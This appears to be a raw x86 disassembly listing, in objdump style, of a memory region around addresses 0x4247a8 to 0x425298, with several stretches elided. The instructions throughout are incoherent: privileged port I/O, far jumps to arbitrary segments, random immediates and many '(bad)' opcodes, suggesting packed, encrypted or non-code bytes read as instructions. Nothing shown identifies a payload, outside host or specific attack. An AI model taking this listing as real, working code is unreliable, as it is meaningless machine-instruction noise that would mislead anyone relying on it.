  4247a8:	xchg   ebx,eax
  4247a9:	int    0x2
  4247ab:	int3   
  4247ac:	xor    ebp,DWORD PTR [ebx-0x396cdd63]
  4247b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247b3:	imul   ecx,DWORD PTR [esi+0x4dc9f064],0xffffffa7
  4247ba:	es dec edi
  4247bc:	loop   0x424769
  4247be:	jl     0x424835
  4247c0:	inc    esp
  4247c1:	jmp    0x38d4:0x89e97b23
  4247c8:	and    esi,DWORD PTR [esi]
  4247ca:	mov    dl,0x51
  4247cc:	je     0x42477b
  4247ce:	mov    BYTE PTR [esi-0xd56d03f],al
  4247d4:	mov    al,0x2a
  4247d6:	xchg   BYTE PTR [ebp+eax*2+0x6d],cl
  4247da:	sahf   
  4247db:	jae    0x424793
  4247dd:	mov    esp,0x3624a0c8
  4247e2:	mov    eax,ds:0xaf8641ef
  4247e7:	add    DWORD PTR [edx+0x76c5b872],0xffffffd4
  4247ee:	mov    ds:0xa618e7c9,eax
  4247f3:	sar    BYTE PTR [ecx-0x65],0xc3
  4247f7:	mov    bl,0xfe
  4247f9:	jge    0x424865
  4247fb:	in     al,0x6f
  4247fd:	and    DWORD PTR [ebx],ecx
  4247ff:	pop    ss
  424800:	pop    ss
  424801:	push   ecx
  424802:	lock lods eax,DWORD PTR ds:[esi]
  424804:	out    0x95,al
  424806:	sub    al,0xd8
  424808:	cld    
  424809:	jmp    0x42480c
  42480b:	jno    0x4247f3
  42480d:	leave  
  42480e:	push   esi
  42480f:	cs aas 
  424811:	dec    edi
  424812:	bound  ebp,QWORD PTR [ecx+0x2264a30f]
  424818:	push   es
  424819:	jns    0x424840
  42481b:	pop    esp
  42481c:	jbe    0x424854
  42481e:	xchg   esp,eax
  42481f:	cmp    BYTE PTR [ebx-0x1c7f2b66],al
  424825:	cmp    BYTE PTR [edx],dl
  424827:	out    0xec,eax
  424829:	sahf   
  42482a:	ins    DWORD PTR es:[edi],dx
  42482b:	mov    eax,0xa3ada95c
  424830:	push   ebx
  424831:	jne    0x4247be
  424833:	inc    ebp
  424834:	imul   ecx,edx,0x39
  424837:	mov    ch,0x30
  424839:	test   eax,0x77ba76bb
  42483e:	addr16 inc ebp
  424840:	xor    DWORD PTR [edx+0x0],ecx
	...
  4248b3:	add    BYTE PTR [edx-0x770e5c],cl
  4248b9:	(bad)  
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x424938
  4248c1:	and    DWORD PTR [esi+edx*8+0x18606],ecx
  4248c8:	test   BYTE PTR [eax],0x0
  4248cb:	add    BYTE PTR [ebp+0x57],ch
  4248ce:	shl    DWORD PTR [ecx-0x46],1
  4248d1:	pop    esi
  4248d2:	and    DWORD PTR [ebx],edx
  4248d4:	repz enter 0xc9d6,0x3a
  4248d9:	loop   0x42485e
  4248db:	jae    0x424954
  4248dd:	add    DWORD PTR ds:0x6ed97769,eax
  4248e3:	stc    
  4248e4:	xsaves [ebx+0x17]
  4248e8:	(bad)  
  4248e9:	clc    
  4248ea:	sbb    edi,DWORD PTR [ebx+0x8]
  4248ed:	xor    BYTE PTR [ebx],cl
  4248ef:	xor    al,0x78
  4248f1:	jns    0x42489e
  4248f3:	sbb    al,0x1a
  4248f5:	push   ss
  4248f6:	pop    ecx
  4248f7:	sub    BYTE PTR es:[edx+0x4],cl
  4248fb:	xlat   BYTE PTR ds:[ebx]
  4248fc:	inc    ebx
  4248fd:	rcl    ecx,1
  4248ff:	int3   
  424900:	(bad)  
  424901:	jb     0x4248bb
  424903:	pop    eax
  424904:	push   ecx
  424905:	add    BYTE PTR [ebx+0x52c85870],al
  42490b:	and    ah,dl
  42490d:	fdivr  QWORD PTR fs:[edx]
  424910:	cmp    esi,DWORD PTR [ebp-0x46164b1c]
  424916:	fadd   QWORD PTR [eax]
  424918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424919:	xor    DWORD PTR [edi+0x615274c5],0x55
  424920:	cmovno esi,DWORD PTR [edx]
  424923:	jae    0x42497f
  424925:	cmp    eax,0x72505103
  42492a:	lods   eax,DWORD PTR ds:[esi]
  42492b:	cmp    BYTE PTR [ebx+0x26aca865],ah
  424931:	mov    eax,ds:0x923016fa
  424936:	xor    DWORD PTR [ebx-0x396dd0f5],0x45
  42493d:	pop    edi
  42493e:	mov    ebp,0x799d6993
  424943:	mov    bh,BYTE PTR [esi-0x2b02e0d0]
  424949:	add    BYTE PTR [ebx+0x22031434],ah
  42494f:	add    BYTE PTR [ebp+0x1b],bh
  424952:	or     esi,DWORD PTR [ebx+0x7a648366]
  424958:	test   BYTE PTR [eax-0x3618c09b],0xa7
  42495f:	(bad)  
  424961:	(bad)
  424964:	jl     0x42495d
  424966:	rcl    DWORD PTR [ebx-0x72],cl
  424969:	mov    esi,0xbebea141
  42496e:	sub    esp,DWORD PTR [ebx+0x6d]
  424971:	cmp    eax,0x729f929f
  424976:	cmp    ch,BYTE PTR [eax]
  424978:	mov    esp,0xdba06366
  42497d:	cwde   
  42497e:	sti    
  42497f:	jge    0x4249b7
  424981:	cli    
  424982:	sbb    eax,0xe43383b1
  424987:	mov    fs,esi
  424989:	mov    ds:0xc09cf000,eax
  42498e:	mov    ds:0xbab28e7c,eax
  424993:	pop    ss
  424994:	in     al,dx
  424995:	in     al,dx
  424996:	icebp  
  424997:	adc    al,0x6
  424999:	bound  edi,QWORD PTR [edx+edi*8+0x46]
  42499d:	sbb    DWORD PTR [eax-0x6a8789dd],0x7a
  4249a4:	xor    BYTE PTR ds:[eax*4+0x58ef9011],bl
  4249ac:	pop    edi
  4249ad:	in     al,dx
  4249ae:	scas   eax,DWORD PTR es:[edi]
  4249af:	dec    BYTE PTR [edi+0x31]
  4249b2:	cmp    al,0x95
  4249b4:	iret   
  4249b5:	mov    bh,0x5a
  4249b7:	inc    edi
  4249b8:	rcl    DWORD PTR [ebp-0x380f99b9],cl
  4249be:	mov    al,ds:0x98eb4d
	...
  424a33:	add    BYTE PTR [eax],dh
  424a35:	cmp    eax,0xdf7d9f75
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	add    eax,0xfc89ac15
  424a45:	xchg   BYTE PTR [ecx],al
  424a47:	add    dh,dh
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    BYTE PTR [edi+0x7917783d],bh
  424a51:	in     eax,0x74
  424a53:	push   0x8342f5b0
  424a58:	repnz add esi,edi
  424a5b:	xor    BYTE PTR [ebx+0x37d9c383],bl
  424a61:	jl     0x424a36
  424a63:	xor    ecx,DWORD PTR [edi+0x65dd4fcf]
  424a69:	(bad)  
  424a6b:	(bad)  
  424a6c:	xchg   edx,eax
  424a6d:	mov    esp,0x51e8f8a8
  424a72:	jmp    0x4249f8
  424a74:	xor    DWORD PTR [ebx-0x4eba43f3],edx
  424a7a:	nop
  424a7b:	push   0x3d
  424a7d:	es sar bl,1
  424a80:	add    cl,BYTE PTR [edx]
  424a82:	loope  0x424a98
  424a84:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  424a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a87:	mov    dh,0x43
  424a89:	lahf   
  424a8a:	cmc    
  424a8b:	dec    edi
  424a8c:	adc    DWORD PTR [ebx],ebp
  424a8e:	mov    esp,DWORD PTR [ebx*4+0x605ef632]
  424a95:	inc    edx
  424a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a97:	xchg   BYTE PTR [esi-0xdcb0a0d],dl
  424a9d:	sbb    DWORD PTR [edi+0x60],0x9444d4d
  424aa4:	push   ds
  424aa5:	xchg   esp,eax
  424aa6:	test   eax,0x5ad50102
  424aab:	rcl    BYTE PTR [ecx+0x2494ac95],cl
  424ab1:	clc    
  424ab2:	or     al,0xa0
  424ab4:	fnstsw WORD PTR [ebx+edi*1+0x158846e5]
  424abb:	ins    BYTE PTR es:[edi],dx
  424abc:	pop    edx
  424abd:	ins    BYTE PTR es:[edi],dx
  424abe:	pop    edx
  424abf:	ins    DWORD PTR es:[edi],dx
  424ac0:	push   cs
  424ac1:	in     eax,0xb1
  424ac3:	sti    
  424ac4:	pushf  
  424ac5:	inc    esp
  424ac6:	(bad)  
  424ac7:	(bad)  [eax-0x3]
  424aca:	fadd   st,st(1)
  424acc:	mov    ah,BYTE PTR [edx-0x57651261]
  424ad2:	ins    DWORD PTR es:[edi],dx
  424ad3:	cdq    
  424ad4:	sti    
  424ad5:	daa    
  424ad6:	adc    dl,BYTE PTR [esi-0x14]
  424ad9:	imul   eax,edx,0x700d4255
  424adf:	(bad)  [esi+eiz*4-0x7e]
  424ae3:	sar    esi,1
  424ae5:	xor    DWORD PTR [ecx+0x5d730575],ebx
  424aeb:	mov    ecx,0x7b006380
  424af0:	rcl    BYTE PTR [eax],cl
  424af2:	not    DWORD PTR [ebp+0x52]
  424af5:	xchg   esp,eax
  424af6:	in     eax,dx
  424af7:	fsub   QWORD PTR [esi]
  424af9:	cld    
  424afa:	cmp    eax,0xd463bc16
  424aff:	(bad)  
  424b01:	xchg   edx,eax
  424b02:	pop    esp
  424b03:	ror    DWORD PTR [ebx+0x6a],1
  424b06:	or     eax,0x93a6a1f3
  424b0b:	js     0x424b2a
  424b0d:	scas   eax,DWORD PTR es:[edi]
  424b0e:	sub    eax,eax
  424b10:	aas    
  424b11:	xchg   ecx,eax
  424b12:	cld    
  424b13:	adc    DWORD PTR [esi+0x72],esi
  424b16:	dec    ebp
  424b17:	in     al,dx
  424b18:	mov    DWORD PTR [edx+0x1c],ebx
  424b1b:	icebp  
  424b1c:	sub    DWORD PTR ds:0x2d4153f1,eax
  424b22:	xchg   ebp,eax
  424b23:	ss sub al,0x8f
  424b26:	lods   eax,DWORD PTR ds:[esi]
  424b27:	(bad)  
  424b29:	daa    
  424b2a:	leave  
  424b2b:	ja     0x424b71
  424b2d:	jbe    0x424b95
  424b2f:	std    
  424b30:	or     al,0xf2
  424b32:	add    eax,0xe964e6f3
  424b37:	and    al,0x70
  424b39:	sbb    DWORD PTR [eax-0x74],0x2d1ed7d1
  424b40:	cmp    dh,BYTE PTR [edx]
	...
  424bb2:	add    BYTE PTR [eax],al
  424bb4:	std    
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx+0xe46077f]
  424bc1:	cmp    al,0xb3
  424bc3:	aaa    
  424bc4:	xacquire xchg DWORD PTR [ecx],eax
  424bc7:	add    dh,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [eax+0x3ca71108],bl
  424bd1:	and    BYTE PTR [edi+0x61],cl
  424bd4:	xor    eax,0xaad15a58
  424bd9:	mov    ah,0x3e
  424bdb:	sbb    DWORD PTR [esi],ebp
  424bdd:	repz mov esi,0x65648560
  424be3:	dec    eax
  424be4:	ins    DWORD PTR es:[edi],dx
  424be5:	(bad)  
  424be6:	out    dx,al
  424be7:	or     esi,ebp
  424be9:	mov    ecx,0x2f874ff6
  424bee:	out    dx,eax
  424bef:	fwait
  424bf0:	stc    
  424bf1:	sbb    ah,BYTE PTR [bp+di+0x1ec6]
  424bf6:	and    BYTE PTR [esi],0xb8
  424bf9:	pop    esi
  424bfa:	ins    DWORD PTR es:[edi],dx
  424bfb:	sub    BYTE PTR [ecx+0x25945b73],0xa5
  424c02:	enter  0x4c16,0xe7
  424c06:	cmp    DWORD PTR [edi],0x20
  424c09:	rol    DWORD PTR [esi-0x7371c3a8],1
  424c0f:	sbb    esi,DWORD PTR [ecx]
  424c11:	lods   al,BYTE PTR ds:[esi]
  424c12:	cmp    DWORD PTR [edx],ebx
  424c14:	sub    eax,DWORD PTR [ebx+0x65]
  424c17:	push   eax
  424c18:	out    dx,al
  424c19:	stos   DWORD PTR es:[edi],eax
  424c1a:	mov    dh,BYTE PTR [ebx-0x44]
  424c1d:	in     eax,dx
  424c1e:	rcl    BYTE PTR [ecx-0x48],1
  424c21:	ins    BYTE PTR es:[edi],dx
  424c22:	jns    0x424c42
  424c24:	or     eax,0x32d87e83
  424c29:	scas   al,BYTE PTR es:[edi]
  424c2a:	jne    0x424c0f
  424c2c:	pop    esp
  424c2d:	sbb    al,0x0
  424c2f:	adc    edi,DWORD PTR [edx+0x12]
  424c32:	aas    
  424c33:	in     al,dx
  424c34:	in     eax,dx
  424c35:	leave  
  424c36:	dec    edx
  424c37:	retf   
  424c38:	or     al,0x49
  424c3a:	popa   
  424c3b:	or     dh,BYTE PTR [eax-0x16c344c2]
  424c41:	enter  0x18a2,0x12
  424c45:	sbb    eax,0x86c41048
  424c4a:	mov    ch,0x84
  424c4c:	mov    edi,edx
  424c4e:	and    al,0x3d
  424c50:	xchg   esp,eax
  424c51:	les    edx,FWORD PTR [ecx+0x38]
  424c54:	cs cmp al,bl
  424c57:	sbb    BYTE PTR [ebx],ch
  424c59:	pop    esi
  424c5a:	cmp    edx,DWORD PTR [esi-0x31418eec]
  424c60:	add    esp,DWORD PTR [edx+0x31117c04]
  424c66:	aaa    
  424c67:	or     ch,BYTE PTR [ebp-0x2254a290]
  424c6d:	fisttp DWORD PTR [edx-0x4d3a7efc]
  424c73:	jmp    0x196d3476
  424c78:	lds    edx,FWORD PTR [ebx]
  424c7a:	dec    edi
  424c7b:	repz and BYTE PTR [eax+edx*4+0x3f],dh
  424c80:	add    dl,BYTE PTR [ebp+eiz*8-0x22b37abe]
  424c87:	jo     0x424c1d
  424c89:	and    ebp,edx
  424c8b:	shl    DWORD PTR [edx],0x5
  424c8e:	mov    esi,0x92afc28b
  424c93:	shl    edx,1
  424c95:	test   BYTE PTR [edx+0x9c27be4],bh
  424c9b:	sub    esp,DWORD PTR [ecx-0x1b]
  424c9e:	mov    esi,0x7ad0ad9d
  424ca3:	retf   
  424ca4:	sbb    eax,0x1e4b5953
  424ca9:	ins    BYTE PTR es:[edi],dx
  424caa:	cs pusha 
  424cac:	sti    
  424cad:	mov    ds:0x1382d73a,al
  424cb2:	mov    al,0xe
  424cb4:	cld    
  424cb5:	repnz out 0xc6,eax
  424cb8:	push   ds
  424cb9:	pop    edi
  424cba:	add    cl,BYTE PTR [eax]
  424cbc:	mov    ecx,0xa78b7073
  424cc1:	popa   
	...
  424d32:	add    BYTE PTR [eax],al
  424d34:	(bad)  
  424d35:	test   BYTE PTR [edi-0x118668f7],0xff
  424d3c:	test   BYTE PTR [ecx+0x60f894d7],cl
  424d42:	jmp    0xf600:0x188e849
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [ecx+0x69104c88],bl
  424d51:	call   0xbc4fb924
  424d56:	inc    esp
  424d57:	dec    ebp
  424d58:	loop   0x424d1d
  424d5a:	or     esp,ebx
  424d5c:	sbb    al,0x4c
  424d5e:	(bad)  
  424d5f:	mov    ebx,0x56249be1
  424d64:	ins    DWORD PTR es:[edi],dx
  424d65:	push   0xca997491
  424d6a:	mov    ah,0x97
  424d6c:	out    dx,al
  424d6d:	add    eax,0x4a56e648
  424d72:	test   al,0x6d
  424d74:	sbb    ebp,DWORD PTR ds:0x36d3befb
  424d7a:	pushf  
  424d7b:	mov    ds:0x6dcba15f,eax
  424d80:	test   esi,0x2003aaa8
  424d86:	sbb    edi,esp
  424d88:	mov    ah,0xc3
  424d8a:	aaa    
  424d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d8c:	(bad)  [eax]
  424d8e:	inc    esp
  424d8f:	sti    
  424d90:	dec    ebp
  424d91:	fcom   QWORD PTR [edi]
  424d93:	std    
  424d94:	addr16 mov esp,0xa84dbe3f
  424d9a:	imul   esi,DWORD PTR [eax+0x36],0x6a65d78f
  424da1:	jle    0x424d3a
  424da3:	mov    ecx,0x9ad65cf2
  424da8:	xchg   ebx,eax
  424da9:	scas   al,BYTE PTR es:[edi]
  424daa:	xchg   esp,eax
  424dab:	push   0x67
  424dad:	arpl   sp,bx
  424daf:	sahf   
  424db0:	call   0x76a7b1b9
  424db5:	mov    edx,0x5f322049
  424dba:	inc    ebp
  424dbb:	mov    dh,0xb0
  424dbd:	cld    
  424dbe:	iret   
  424dbf:	iret   
  424dc0:	adc    al,0xff
  424dc2:	mov    al,ds:0x34f4b06e
  424dc7:	inc    esp
  424dc8:	sub    DWORD PTR [esi+0x66],eax
  424dcb:	(bad)  
  424dcc:	mov    DWORD PTR [edi+esi*4-0x53],esp
  424dd0:	mov    DWORD PTR [ebx-0x76d6eabd],ebx
  424dd6:	sub    eax,0xad89a816
  424ddb:	test   esi,edx
  424ddd:	lea    eax,[edx]
  424ddf:	in     al,dx
  424de0:	(bad)  
  424de1:	sahf   
  424de2:	inc    ebp
  424de3:	mul    DWORD PTR [eax]
  424de5:	pop    ebp
  424de6:	jge    0x424e49
  424de8:	push   esi
  424de9:	loop   0x424de7
  424deb:	xor    al,0xd8
  424ded:	sbb    cl,ch
  424def:	aad    0xb5
  424df1:	and    ecx,ecx
  424df3:	retf   0x254
  424df6:	outs   dx,BYTE PTR ds:[esi]
  424df7:	cmp    BYTE PTR [edx],bl
  424df9:	les    edi,FWORD PTR [esi-0x31]
  424dfc:	and    DWORD PTR ds:0x134dcfb4,0x7b
  424e03:	add    ebp,DWORD PTR [ecx+0x33f84745]
  424e09:	call   0xbb87fdd0
  424e0e:	inc    ecx
  424e0f:	pop    ds
  424e10:	retf   0x453
  424e13:	cld    
  424e14:	retf   0x52b2
  424e17:	pop    eax
  424e18:	and    al,0xcf
  424e1a:	push   ebp
  424e1b:	arpl   WORD PTR [ebx+0x43],bx
  424e1e:	jae    0x424dbd
  424e20:	push   ebx
  424e21:	rol    DWORD PTR [ebp-0x66],1
  424e24:	push   es
  424e25:	adc    dl,al
  424e27:	in     al,dx
  424e28:	mov    DWORD PTR [eax-0x9],esp
  424e2b:	pushf  
  424e2c:	int    0xe3
  424e2e:	push   ebx
  424e2f:	popa   
  424e30:	in     eax,dx
  424e31:	add    al,0xe0
  424e33:	pop    ecx
  424e34:	mov    bl,BYTE PTR [ebx+0x3c33d989]
  424e3a:	or     bl,BYTE PTR [edx-0x43]
  424e3d:	in     eax,0x11
  424e3f:	ins    DWORD PTR es:[edi],dx
  424e40:	xor    al,0x59
	...
  424eb2:	add    BYTE PTR [eax],al
  424eb4:	scas   al,BYTE PTR es:[edi]
  424eb5:	call   0x9fff:0xff74b964
  424ebc:	xchg   edx,eax
  424ebd:	dec    ebp
  424ebe:	lea    edx,[edx+0x5385e6b9]
  424ec4:	fimul  WORD PTR [ecx+0xf60001]
  424eca:	add    BYTE PTR [eax],al
  424ecc:	jmp    0x9104:0xb42c4fc6
  424ed3:	mov    dh,0xa8
  424ed5:	xchg   edx,eax
  424ed6:	retf   
  424ed7:	add    eax,0xb2b63e40
  424edc:	ffreep st(7)
  424ede:	ins    BYTE PTR es:[edi],dx
  424edf:	cmp    bh,bl
  424ee1:	mov    edi,0x350236ff
  424ee6:	in     al,dx
  424ee7:	in     al,dx
  424ee8:	push   0xffffffe6
  424eea:	dec    ebx
  424eeb:	gs leave 
  424eed:	mov    cl,0xc9
  424eef:	mov    dh,bh
  424ef1:	push   esi
  424ef2:	int3   
  424ef3:	pop    ecx
  424ef4:	outs   dx,DWORD PTR ds:[esi]
  424ef5:	push   eax
  424ef6:	sub    eax,0xfad1ed71
  424efb:	inc    ebx
  424efc:	xor    ebx,esi
  424efe:	sbb    esi,ecx
  424f00:	int3   
  424f01:	aam    0xbb
  424f03:	sbb    BYTE PTR [ebx],ch
  424f05:	or     eax,0x7e209431
  424f0a:	xchg   ecx,eax
  424f0b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  424f0d:	stos   BYTE PTR es:[edi],al
  424f0e:	mov    WORD PTR [esi+0x1e],gs
  424f11:	add    DWORD PTR [edx+0x7f],0xd68084b4
  424f18:	push   0x7a
  424f1a:	mov    gs,WORD PTR [edi]
  424f1c:	cmp    al,0x2c
  424f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f1f:	inc    ebx
  424f20:	lds    ebp,FWORD PTR [ecx-0x1ef42bab]
  424f26:	loopne 0x424f56
  424f28:	jae    0x424f2a
  424f2a:	out    dx,al
  424f2b:	(bad)  
  424f2c:	hlt    
  424f2d:	mov    al,0x37
  424f2f:	repnz sahf 
  424f31:	push   ds
  424f32:	or     BYTE PTR cs:[esi+0x6a],0x82
  424f37:	imul   ebx,ebx,0x81b9ae64
  424f3d:	loop   0x424ee5
  424f3f:	adc    al,0xcc
  424f41:	mov    BYTE PTR [esi-0x63],bl
  424f44:	inc    edi
  424f45:	mov    esi,0x64626dd5
  424f4a:	jg     0x424ed5
  424f4c:	mov    bh,0x8f
  424f4e:	popf   
  424f4f:	rcl    DWORD PTR [edi-0xdb22d1c],1
  424f55:	and    DWORD PTR [edi],edi
  424f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f58:	sbb    esp,ebx
  424f5a:	jmp    0x5267:0xfb556c4d
  424f61:	popa   
  424f62:	mov    cl,0x4a
  424f64:	sbb    eax,esi
  424f66:	ret    
  424f67:	es leave 
  424f69:	nop
  424f6a:	push   0x9da1906f
  424f6f:	out    dx,al
  424f70:	sbb    BYTE PTR [eax],0x63
  424f73:	pop    esp
  424f74:	(bad)  [edx]
  424f76:	pop    es
  424f77:	sbb    BYTE PTR [eax-0x2d],ah
  424f7a:	pop    ds
  424f7b:	stos   BYTE PTR es:[edi],al
  424f7c:	clc    
  424f7d:	pop    ebp
  424f7e:	dec    esp
  424f7f:	scas   al,BYTE PTR es:[edi]
  424f80:	(bad)  
  424f81:	call   DWORD PTR [esi-0x30]
  424f84:	shl    cl,0xc1
  424f87:	sbb    ecx,edi
  424f89:	sti    
  424f8a:	cmp    al,0xc9
  424f8c:	jle    0x424f44
  424f8e:	int3   
  424f8f:	sbb    al,0xe1
  424f91:	call   0x8a45:0xfbb36b93
  424f98:	idiv   DWORD PTR [eax-0x40]
  424f9b:	outs   dx,DWORD PTR ds:[esi]
  424f9c:	push   0x4580f37c
  424fa1:	test   eax,0xfbe0c00f
  424fa6:	mov    edx,0x8302fc5e
  424fab:	adc    eax,0xbe756a0f
  424fb0:	ss mov bl,0x49
  424fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fb4:	sub    BYTE PTR [edi],al
  424fb6:	test   al,0x5f
  424fb8:	cmp    eax,0x676c91a3
  424fbd:	jb     0x424f44
  424fbf:	ret    0x21ff
	...
  425032:	add    BYTE PTR [eax],al
  425034:	jl     0x42508e
  425036:	cs mov cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	sar    dl,1
  425042:	xor    DWORD PTR [edx],eax
  425044:	aam    0x8a
  425046:	add    DWORD PTR [eax],eax
  425048:	test   BYTE PTR [eax],0x0
  42504b:	add    BYTE PTR [eax-0x2924ffb],ch
  425051:	jno    0x424fe2
  425053:	mov    dl,0x5b
  425055:	mov    ebp,0x1fb45527
  42505a:	mov    es,WORD PTR [edx]
  42505c:	fisttp DWORD PTR [esi+0x15261a2e]
  425062:	sar    DWORD PTR [ecx-0x538070ba],0xd5
  425069:	sbb    DWORD PTR [ebx-0x2a878f34],ebx
  42506f:	inc    ebx
  425070:	jnp    0x424ff9
  425072:	push   0x53
  425074:	sub    DWORD PTR [edi-0x1cc76f2b],edi
  42507a:	aad    0x5d
  42507c:	jle    0x425093
  42507e:	and    DWORD PTR [esi+0x575785b3],ebx
  425084:	jge    0x4250f8
  425086:	(bad)  
  425087:	shr    BYTE PTR [ebx+0x17d2030f],1
  42508d:	repz jecxz 0x425104
  425090:	sar    ebp,0xa6
  425093:	adc    eax,0x1bd2b700
  425098:	mov    ah,dh
  42509a:	pop    esi
  42509b:	mov    ch,0xd0
  42509d:	mov    al,0x3a
  42509f:	fmul   QWORD PTR [ecx]
  4250a1:	pop    es
  4250a2:	push   ebp
  4250a3:	loopne 0x4250b8
  4250a5:	in     eax,0x13
  4250a7:	jbe    0x4250d1
  4250a9:	push   ebp
  4250aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250ab:	or     ebp,DWORD PTR [esi+0x43]
  4250ae:	iret   
  4250af:	pushf  
  4250b0:	loopne 0x4250e7
  4250b2:	add    DWORD PTR [edi-0x274bac29],edx
  4250b8:	sbb    al,dh
  4250ba:	vmwrite ebp,DWORD PTR [ebx+0xf]
  4250be:	sar    ebp,0x34
  4250c1:	daa    
  4250c2:	stos   BYTE PTR es:[edi],al
  4250c3:	aaa    
  4250c4:	stc    
  4250c5:	pushf  
  4250c6:	fnsave [ebp-0x68f3bbdc]
  4250cc:	mov    esi,0x3c61cb5f
  4250d1:	mov    al,ds:0x99121ad
  4250d6:	jl     0x4250b1
  4250d8:	mov    eax,DWORD PTR [esi]
  4250da:	jnp    0x4250ff
  4250dc:	dec    esp
  4250dd:	add    eax,0xf1a5a4fe
  4250e2:	xor    esi,DWORD PTR [ebx]
  4250e4:	(bad)  
  4250e5:	jmp    0x42515a
  4250e7:	push   ebp
  4250e8:	mov    eax,ds:0x9887212d
  4250ed:	pushf  
  4250ee:	jbe    0x4250c2
  4250f0:	inc    ebx
  4250f1:	repnz add BYTE PTR [eax-0x45],ah
  4250f5:	pop    esp
  4250f6:	stos   DWORD PTR es:[edi],eax
  4250f7:	push   eax
  4250f8:	aaa    
  4250f9:	test   DWORD PTR [edx+0x7c],edi
  4250fc:	imul   ecx,DWORD PTR es:[ecx+0x1e],0xffffffed
  425101:	imul   eax,DWORD PTR [esi],0x98dce28a
  425107:	adc    DWORD PTR [ebp-0x5b40444b],ebx
  42510d:	cmp    eax,0x4baef7cd
  425112:	mov    dh,0x33
  425114:	pop    es
  425115:	outs   dx,DWORD PTR ds:[esi]
  425116:	ror    DWORD PTR [eax+0x37],1
  425119:	(bad)  
  42511a:	movhps QWORD PTR [eax+eax*1+0x1f],xmm3
  42511f:	sub    eax,DWORD PTR [ebp-0x34bdd06e]
  425125:	push   ss
  425126:	add    eax,0xb57ee9f4
  42512b:	push   0x5afdf429
  425130:	(bad)  
  425131:	push   edx
  425132:	test   DWORD PTR [edx-0x5cd4ec1f],edx
  425138:	sub    DWORD PTR [ecx-0x51],0xa069a451
  42513f:	xchg   edx,eax
  425140:	cdq    
  425141:	test   DWORD PTR [eax],eax
	...
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	out    0x36,eax
  4251c2:	xchg   esp,eax
  4251c3:	pop    ecx
  4251c4:	retf   0x18b
  4251c7:	add    dh,dh
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR [ecx],dh
  4251cd:	dec    ecx
  4251ce:	gs ins BYTE PTR es:[edi],dx
  4251d0:	adc    eax,0x4df3cf00
  4251d5:	ror    ch,0x1b
  4251d8:	ins    DWORD PTR es:[edi],dx
  4251d9:	mov    ds:0xa72be76d,eax
  4251de:	cli    
  4251df:	int3   
  4251e0:	fs int 0x3c
  4251e3:	push   ebp
  4251e4:	rcl    BYTE PTR [eax],0x3e
  4251e7:	aad    0x4a
  4251e9:	mov    esi,0x81428f64
  4251ee:	stos   DWORD PTR es:[edi],eax
  4251ef:	mov    bl,0xfc
  4251f1:	or     esp,DWORD PTR [ebp+0xf]
  4251f4:	or     ah,BYTE PTR [edi+0xf]
  4251f7:	ss loope 0x42525a
  4251fa:	nop
  4251fb:	aaa    
  4251fc:	and    eax,0xf3341e76
  425201:	enter  0x8fb1,0x8d
  425205:	mov    esp,0x8bfc57af
  42520a:	in     al,dx
  42520b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42520c:	hlt    
  42520d:	lea    esp,[ecx-0x62a2f618]
  425213:	bound  ebx,QWORD PTR [ebp+0x6a]
  425216:	jp     0x42522e
  425218:	jge    0x425235
  42521a:	in     al,dx
  42521b:	mov    ebp,0xcc03f39b
  425220:	xchg   edx,eax
  425221:	and    DWORD PTR [edx+ebp*4-0x41ed0e80],ebx
  425228:	pop    ss
  425229:	and    al,0x8b
  42522b:	pop    ebx
  42522c:	cli    
  42522d:	xchg   esi,eax
  42522e:	or     eax,0x5447528e
  425233:	js     0x425213
  425235:	clc    
  425236:	add    al,0x1c
  425238:	loope  0x4251bf
  42523a:	add    ah,dh
  42523c:	imul   esi,DWORD PTR [eax-0x6e],0x31
  425240:	test   DWORD PTR [edx],eax
  425242:	adc    eax,0xab7b18fb
  425247:	jl     0x425248
  425249:	inc    edx
  42524a:	pop    ss
  42524b:	mov    bh,0x52
  42524d:	(bad)  
  42524f:	xchg   ebx,eax
  425250:	dec    edx
  425251:	mov    esp,0xbd73ad7a
  425256:	dec    eax
  425257:	sbb    al,0x1d
  425259:	stc    
  42525a:	in     al,0x39
  42525c:	adc    edi,DWORD PTR [esi-0x5a5bd8aa]
  425262:	fidiv  DWORD PTR [eax]
  425264:	retf   
  425265:	xchg   esi,eax
  425266:	sbb    esi,DWORD PTR [eax+0x1964824c]
  42526c:	xor    al,0x8b
  42526e:	mov    BYTE PTR [ebx+esi*1-0x1aabfae0],bl
  425275:	jae    0x425242
  425277:	xor    al,0x59
  425279:	hlt    
  42527a:	(bad)  
  42527b:	mov    edx,0xfbccd162
  425280:	mov    DWORD PTR cs:[edi-0x7f629720],esp
  425287:	inc    ebp
  425288:	sub    dh,al
  42528a:	test   ch,ah
  42528c:	aam    0xb3
  42528e:	jmp    0x10ebaf35
  425293:	mov    bh,0xec
  425295:	pop    es
  425296:	iret   
  425297:	push   edx
  425298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
